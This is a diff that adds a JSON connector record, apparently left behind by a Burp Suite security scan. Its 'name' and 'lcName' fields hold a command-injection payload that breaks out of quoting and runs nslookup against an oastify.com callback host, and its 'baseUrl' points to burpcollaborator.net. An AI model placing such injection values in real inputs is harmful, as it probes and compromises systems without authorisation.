@@ -1,0 +1,17 @@
+{
+	"baseUrl":"http://burpcollaborator.net/SRldPmpG",
+	"createdTime":1741509474478,
+	"deleted":false,
+	"description":"xPciEr",
+	"enabled":false,
+	"id":"67cd53623aa5057dd6e7d21b",
+	"lastModifiedBy":22743,
+	"lcName":"lhozsa'\"`0&nslookup -q=cname f6mjwyq9zmmeqmzcfv6v2o15ewkp8gy4vsnfd32.oastify.com.&`'",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741509474478,
+	"name":"lhoZsa'\"`0&nslookup -q=cname f6mjwyq9zmmeqmzcfv6v2o15ewkp8gy4vsnfd32.oastify.com.&`'",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
